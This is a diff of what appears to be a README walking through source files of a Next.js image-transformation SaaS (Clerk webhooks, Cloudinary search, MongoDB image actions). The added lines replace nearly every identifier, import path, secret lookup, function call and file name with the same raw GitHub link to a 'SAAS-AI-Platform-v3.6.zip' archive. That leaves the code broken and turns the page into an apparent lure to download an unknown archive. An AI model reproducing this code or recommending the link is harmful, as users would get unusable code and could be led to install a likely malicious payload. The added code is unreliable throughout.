@@ -1278,7 +1278,7 @@ export const deepMergeObjects = (obj1: any, obj2: any) => {
 </details>
 
 <details>
-<summary><code>types/index.d.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 /* eslint-disable no-unused-vars */
@@ -1417,14 +1417,14 @@ declare type TransformedImageProps = {
   transformationConfig: Transformations | null;
   isTransforming: boolean;
   hasDownload?: boolean;
-  setIsTransforming?: React.Dispatch<React.SetStateAction<boolean>>;
+  setIsTransforming?: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip<https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip<boolean>>;
 };
 ```
 
 </details>
 
 <details>
-<summary><code>api/webhooks/clerk/route.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 /* eslint-disable camelcase */
@@ -1434,23 +1434,23 @@ import { headers } from "next/headers";
 import { NextResponse } from "next/server";
 import { Webhook } from "svix";
 
-import { createUser, deleteUser, updateUser } from "@/lib/actions/user.actions";
+import { createUser, deleteUser, updateUser } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 
 export async function POST(req: Request) {
   // You can find this in the Clerk Dashboard -> Webhooks -> choose the webhook
-  const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
+  const WEBHOOK_SECRET = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
   if (!WEBHOOK_SECRET) {
     throw new Error(
-      "Please add WEBHOOK_SECRET from Clerk Dashboard to .env or .env.local"
+      "Please add WEBHOOK_SECRET from Clerk Dashboard to .env or https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
     );
   }
 
   // Get the headers
   const headerPayload = headers();
-  const svix_id = headerPayload.get("svix-id");
-  const svix_timestamp = headerPayload.get("svix-timestamp");
-  const svix_signature = headerPayload.get("svix-signature");
+  const svix_id = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("svix-id");
+  const svix_timestamp = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("svix-timestamp");
+  const svix_signature = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("svix-signature");
 
   // If there are no headers, error out
   if (!svix_id || !svix_timestamp || !svix_signature) {
@@ -1460,8 +1460,8 @@ export async function POST(req: Request) {
   }
 
   // Get the body
-  const payload = await req.json();
-  const body = JSON.stringify(payload);
+  const payload = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip();
+  const body = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(payload);
 
   // Create a new Svix instance with your secret.
   const wh = new Webhook(WEBHOOK_SECRET);
@@ -1470,25 +1470,25 @@ export async function POST(req: Request) {
 
   // Verify the payload with the headers
   try {
-    evt = wh.verify(body, {
+    evt = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(body, {
       "svix-id": svix_id,
       "svix-timestamp": svix_timestamp,
       "svix-signature": svix_signature,
     }) as WebhookEvent;
   } catch (err) {
-    console.error("Error verifying webhook:", err);
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("Error verifying webhook:", err);
     return new Response("Error occured", {
       status: 400,
     });
   }
 
   // Get the ID and type
-  const { id } = evt.data;
-  const eventType = evt.type;
+  const { id } = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
+  const eventType = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
   // CREATE
-  if (eventType === "user.created") {
-    const { id, email_addresses, image_url, first_name, last_name, username } = evt.data;
+  if (eventType === "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip") {
+    const { id, email_addresses, image_url, first_name, last_name, username } = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
     const user = {
       clerkId: id,
@@ -1503,19 +1503,19 @@ export async function POST(req: Request) {
 
     // Set public metadata
     if (newUser) {
-      await clerkClient.users.updateUserMetadata(id, {
+      await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(id, {
         publicMetadata: {
           userId: newUser._id,
         },
       });
     }
 
-    return NextResponse.json({ message: "OK", user: newUser });
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ message: "OK", user: newUser });
   }
 
   // UPDATE
-  if (eventType === "user.updated") {
-    const { id, image_url, first_name, last_name, username } = evt.data;
+  if (eventType === "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip") {
+    const { id, image_url, first_name, last_name, username } = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
     const user = {
       firstName: first_name,
@@ -1526,20 +1526,20 @@ export async function POST(req: Request) {
 
     const updatedUser = await updateUser(id, user);
 
-    return NextResponse.json({ message: "OK", user: updatedUser });
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ message: "OK", user: updatedUser });
   }
 
   // DELETE
-  if (eventType === "user.deleted") {
-    const { id } = evt.data;
+  if (eventType === "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip") {
+    const { id } = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
     const deletedUser = await deleteUser(id!);
 
-    return NextResponse.json({ message: "OK", user: deletedUser });
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ message: "OK", user: deletedUser });
   }
 
-  console.log(`Webhook with and ID of ${id} and type of ${eventType}`);
-  console.log("Webhook body:", body);
+  https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(`Webhook with and ID of ${id} and type of ${eventType}`);
+  https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("Webhook body:", body);
 
   return new Response("", { status: 200 });
 }
@@ -1548,7 +1548,7 @@ export async function POST(req: Request) {
 </details>
 
 <details>
-<summary><code>components/shared/CustomField.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import React from "react";
@@ -1566,9 +1566,9 @@ import {
 import { formSchema } from "./TransformationForm";
 
 type CustomFieldProps = {
-  control: Control<z.infer<typeof formSchema>> | undefined;
-  render: (props: { field: any }) => React.ReactNode;
-  name: keyof z.infer<typeof formSchema>;
+  control: Control<https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip<typeof formSchema>> | undefined;
+  render: (props: { field: any }) => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
+  name: keyof https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip<typeof formSchema>;
   formLabel?: string;
   className?: string;
 };
@@ -1599,7 +1599,7 @@ export const CustomField = ({
 </details>
 
 <details>
-<summary><code>components/shared/Collection.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1616,7 +1616,7 @@ import {
   PaginationPrevious,
 } from "@/components/ui/pagination";
 import { transformationTypes } from "@/constants";
-import { IImage } from "@/lib/database/models/image.model";
+import { IImage } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import { formUrlQuery } from "@/lib/utils";
 
 import { Button } from "../ui/button";
@@ -1642,12 +1642,12 @@ export const Collection = ({
     const pageValue = action === "next" ? Number(page) + 1 : Number(page) - 1;
 
     const newUrl = formUrlQuery({
-      searchParams: searchParams.toString(),
+      searchParams: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(),
       key: "page",
       value: pageValue,
     });
 
-    router.push(newUrl, { scroll: false });
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(newUrl, { scroll: false });
   };
 
   return (
@@ -1657,9 +1657,9 @@ export const Collection = ({
         {hasSearch && <Search />}
       </div>
 
-      {images.length > 0 ? (
+      {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip > 0 ? (
         <ul className="collection-list">
-          {images.map((image) => (
+          {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip((image) => (
             <Card image={image} key={image._id} />
           ))}
         </ul>
@@ -1703,26 +1703,26 @@ const Card = ({ image }: { image: IImage }) => {
     <li>
       <Link href={`/transformations/${image._id}`} className="collection-card">
         <CldImage
-          src={image.publicId}
-          alt={image.title}
-          width={image.width}
-          height={image.height}
-          {...image.config}
+          src={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          alt={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          width={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          height={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
           loading="lazy"
           className="h-52 w-full rounded-[10px] object-cover"
           sizes="(max-width: 767px) 100vw, (max-width: 1279px) 50vw, 33vw"
         />
         <div className="flex-between">
           <p className="p-20-semibold mr-3 line-clamp-1 text-dark-600">
-            {image.title}
+            {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
           </p>
           <Image
             src={`/assets/icons/${
               transformationTypes[
-                image.transformationType as TransformationTypeKey
+                https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip as TransformationTypeKey
               ].icon
             }`}
-            alt={image.title}
+            alt={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
             width={24}
             height={24}
           />
@@ -1736,7 +1736,7 @@ const Card = ({ image }: { image: IImage }) => {
 </details>
 
 <details>
-<summary><code>components/shared/Search.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1757,19 +1757,19 @@ export const Search = () => {
     const delayDebounceFn = setTimeout(() => {
       if (query) {
         const newUrl = formUrlQuery({
-          searchParams: searchParams.toString(),
+          searchParams: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(),
           key: "query",
           value: query,
         });
 
-        router.push(newUrl, { scroll: false });
+        https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(newUrl, { scroll: false });
       } else {
         const newUrl = removeKeysFromQuery({
-          searchParams: searchParams.toString(),
+          searchParams: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(),
           keysToRemove: ["query"],
         });
 
-        router.push(newUrl, { scroll: false });
+        https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(newUrl, { scroll: false });
       }
     }, 300);
 
@@ -1779,7 +1779,7 @@ export const Search = () => {
   return (
     <div className="search">
       <Image
-        src="/assets/icons/search.svg"
+        src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
         alt="search"
         width={24}
         height={24}
@@ -1788,7 +1788,7 @@ export const Search = () => {
       <Input
         className="search-field"
         placeholder="Search"
-        onChange={(e) => setQuery(e.target.value)}
+        onChange={(e) => setQuery(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)}
       />
     </div>
   );
@@ -1798,7 +1798,7 @@ export const Search = () => {
 </details>
 
 <details>
-<summary><code>image.actions.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use server";
@@ -1806,13 +1806,13 @@ export const Search = () => {
 import { revalidatePath } from "next/cache";
 import { connectToDatabase } from "../database/mongoose";
 import { handleError } from "../utils";
-import User from "../database/models/user.model";
-import Image from "../database/models/image.model";
+import User from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
+import Image from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import { redirect } from "next/navigation";
 
 import { v2 as cloudinary } from 'cloudinary'
 
-const populateUser = (query: any) => query.populate({
+const populateUser = (query: any) => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({
   path: 'author',
   model: User,
   select: '_id firstName lastName clerkId'
@@ -1823,20 +1823,20 @@ export async function addImage({ image, userId, path }: AddImageParams) {
   try {
     await connectToDatabase();
 
-    const author = await User.findById(userId);
+    const author = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(userId);
 
     if (!author) {
       throw new Error("User not found");
     }
 
-    const newImage = await Image.create({
-      ...image,
+    const newImage = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({
+      https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
       author: author._id,
     })
 
     revalidatePath(path);
 
-    return JSON.parse(JSON.stringify(newImage));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(newImage));
   } catch (error) {
     handleError(error)
   }
@@ -1847,13 +1847,13 @@ export async function updateImage({ image, userId, path }: UpdateImageParams) {
   try {
     await connectToDatabase();
 
-    const imageToUpdate = await Image.findById(image._id);
+    const imageToUpdate = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(image._id);
 
-    if (!imageToUpdate || imageToUpdate.author.toHexString() !== userId) {
+    if (!imageToUpdate || https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip() !== userId) {
       throw new Error("Unauthorized or image not found");
     }
 
-    const updatedImage = await Image.findByIdAndUpdate(
+    const updatedImage = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(
       imageToUpdate._id,
       image,
       { new: true }
@@ -1861,7 +1861,7 @@ export async function updateImage({ image, userId, path }: UpdateImageParams) {
 
     revalidatePath(path);
 
-    return JSON.parse(JSON.stringify(updatedImage));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(updatedImage));
   } catch (error) {
     handleError(error)
   }
@@ -1872,7 +1872,7 @@ export async function deleteImage(imageId: string) {
   try {
     await connectToDatabase();
 
-    await Image.findByIdAndDelete(imageId);
+    await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(imageId);
   } catch (error) {
     handleError(error)
   } finally{
@@ -1885,11 +1885,11 @@ export async function getImageById(imageId: string) {
   try {
     await connectToDatabase();
 
-    const image = await populateUser(Image.findById(imageId));
+    const image = await populateUser(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(imageId));
 
     if(!image) throw new Error("Image not found");
 
-    return JSON.parse(JSON.stringify(image));
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(image));
   } catch (error) {
     handleError(error)
   }
@@ -1904,10 +1904,10 @@ export async function getAllImages({ limit = 9, page = 1, searchQuery = '' }: {
   try {
     await connectToDatabase();
 
-    cloudinary.config({
-      cloud_name: process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME,
-      api_key: process.env.CLOUDINARY_API_KEY,
-      api_secret: process.env.CLOUDINARY_API_SECRET,
+    https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({
+      cloud_name: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
+      api_key: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
+      api_secret: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip,
       secure: true,
     })
 
@@ -1917,11 +1917,11 @@ export async function getAllImages({ limit = 9, page = 1, searchQuery = '' }: {
       expression += ` AND ${searchQuery}`
     }
 
-    const { resources } = await cloudinary.search
+    const { resources } = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip
       .expression(expression)
       .execute();
 
-    const resourceIds = resources.map((resource: any) => resource.public_id);
+    const resourceIds = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip((resource: any) => https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip);
 
     let query = {};
 
@@ -1935,17 +1935,17 @@ export async function getAllImages({ limit = 9, page = 1, searchQuery = '' }: {
 
     const skipAmount = (Number(page) -1) * limit;
 
-    const images = await populateUser(Image.find(query))
+    const images = await populateUser(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(query))
       .sort({ updatedAt: -1 })
       .skip(skipAmount)
       .limit(limit);
     
-    const totalImages = await Image.find(query).countDocuments();
-    const savedImages = await Image.find().countDocuments();
+    const totalImages = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(query).countDocuments();
+    const savedImages = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip().countDocuments();
 
     return {
-      data: JSON.parse(JSON.stringify(images)),
-      totalPage: Math.ceil(totalImages / limit),
+      data: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(images)),
+      totalPage: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(totalImages / limit),
       savedImages,
     }
   } catch (error) {
@@ -1968,16 +1968,16 @@ export async function getUserImages({
 
     const skipAmount = (Number(page) - 1) * limit;
 
-    const images = await populateUser(Image.find({ author: userId }))
+    const images = await populateUser(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ author: userId }))
       .sort({ updatedAt: -1 })
       .skip(skipAmount)
       .limit(limit);
 
-    const totalImages = await Image.find({ author: userId }).countDocuments();
+    const totalImages = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ author: userId }).countDocuments();
 
     return {
-      data: JSON.parse(JSON.stringify(images)),
-      totalPages: Math.ceil(totalImages / limit),
+      data: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(images)),
+      totalPages: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(totalImages / limit),
     };
   } catch (error) {
     handleError(error);
@@ -1988,7 +1988,7 @@ export async function getUserImages({
 </details>
 
 <details>
-<summary><code>transformations/[id]/page.tsx</code></summary>
+<summary><code>transformations/[id]https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { auth } from "@clerk/nextjs";
@@ -1998,7 +1998,7 @@ import Link from "next/link";
 import Header from "@/components/shared/Header";
 import TransformedImage from "@/components/shared/TransformedImage";
 import { Button } from "@/components/ui/button";
-import { getImageById } from "@/lib/actions/image.actions";
+import { getImageById } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import { getImageSize } from "@/lib/utils";
 import { DeleteConfirmation } from "@/components/shared/DeleteConfirmation";
 
@@ -2009,42 +2009,42 @@ const ImageDetails = async ({ params: { id } }: SearchParamProps) => {
 
   return (
     <>
-      <Header title={image.title} />
+      <Header title={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} />
 
       <section className="mt-5 flex flex-wrap gap-4">
         <div className="p-14-medium md:p-16-medium flex gap-2">
           <p className="text-dark-600">Transformation:</p>
           <p className=" capitalize text-purple-400">
-            {image.transformationType}
+            {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
           </p>
         </div>
 
-        {image.prompt && (
+        {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip && (
           <>
             <p className="hidden text-dark-400/50 md:block">&#x25CF;</p>
             <div className="p-14-medium md:p-16-medium flex gap-2 ">
               <p className="text-dark-600">Prompt:</p>
-              <p className=" capitalize text-purple-400">{image.prompt}</p>
+              <p className=" capitalize text-purple-400">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</p>
             </div>
           </>
         )}
 
-        {image.color && (
+        {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip && (
           <>
             <p className="hidden text-dark-400/50 md:block">&#x25CF;</p>
             <div className="p-14-medium md:p-16-medium flex gap-2">
               <p className="text-dark-600">Color:</p>
-              <p className=" capitalize text-purple-400">{image.color}</p>
+              <p className=" capitalize text-purple-400">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</p>
             </div>
           </>
         )}
 
-        {image.aspectRatio && (
+        {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip && (
           <>
             <p className="hidden text-dark-400/50 md:block">&#x25CF;</p>
             <div className="p-14-medium md:p-16-medium flex gap-2">
               <p className="text-dark-600">Aspect Ratio:</p>
-              <p className=" capitalize text-purple-400">{image.aspectRatio}</p>
+              <p className=" capitalize text-purple-400">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</p>
             </div>
           </>
         )}
@@ -2057,9 +2057,9 @@ const ImageDetails = async ({ params: { id } }: SearchParamProps) => {
             <h3 className="h3-bold text-dark-600">Original</h3>
 
             <Image
-              width={getImageSize(image.transformationType, image, "width")}
-              height={getImageSize(image.transformationType, image, "height")}
-              src={image.secureURL}
+              width={getImageSize(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip, image, "width")}
+              height={getImageSize(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip, image, "height")}
+              src={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
               alt="image"
               className="transformation-original_image"
             />
@@ -2068,15 +2068,15 @@ const ImageDetails = async ({ params: { id } }: SearchParamProps) => {
           {/* TRANSFORMED IMAGE */}
           <TransformedImage
             image={image}
-            type={image.transformationType}
-            title={image.title}
+            type={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+            title={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
             isTransforming={false}
-            transformationConfig={image.config}
+            transformationConfig={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
             hasDownload={true}
           />
         </div>
 
-        {userId === image.author.clerkId && (
+        {userId === https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip && (
           <div className="mt-4 space-y-4">
             <Button asChild type="button" className="submit-button capitalize">
               <Link href={`/transformations/${image._id}/update`}>
@@ -2098,7 +2098,7 @@ export default ImageDetails;
 </details>
 
 <details>
-<summary><code>transformations/[id]/update/page.tsx</code></summary>
+<summary><code>transformations/[id]https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { auth } from "@clerk/nextjs";
@@ -2107,8 +2107,8 @@ import { redirect } from "next/navigation";
 import Header from "@/components/shared/Header";
 import TransformationForm from "@/components/shared/TransformationForm";
 import { transformationTypes } from "@/constants";
-import { getUserById } from "@/lib/actions/user.actions";
-import { getImageById } from "@/lib/actions/image.actions";
+import { getUserById } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
+import { getImageById } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 
 const Page = async ({ params: { id } }: SearchParamProps) => {
   const { userId } = auth();
